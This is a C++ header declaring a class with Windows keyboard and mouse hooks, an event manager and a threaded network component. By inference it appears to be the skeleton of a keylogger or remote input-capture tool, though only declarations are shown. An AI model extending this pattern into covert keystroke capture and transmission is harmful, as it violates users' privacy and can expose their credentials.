#pragma once

#include <thread>
#include "EventManager.hpp"
#include "Network.hpp"

class Data
{
public:
	Data();
	~Data();
	static LRESULT CALLBACK KbProc(int code, WPARAM wp, LPARAM lp);
	static LRESULT CALLBACK MsProc(int code, WPARAM wp, LPARAM lp);
private:
	static EventManager	*_sman;
	EventManager		*_man;
	Network				*_net;
	std::thread				*_evt;
	std::thread				*_Tnet;
	HHOOK				 _mHook;
	HHOOK				 _kHook;
};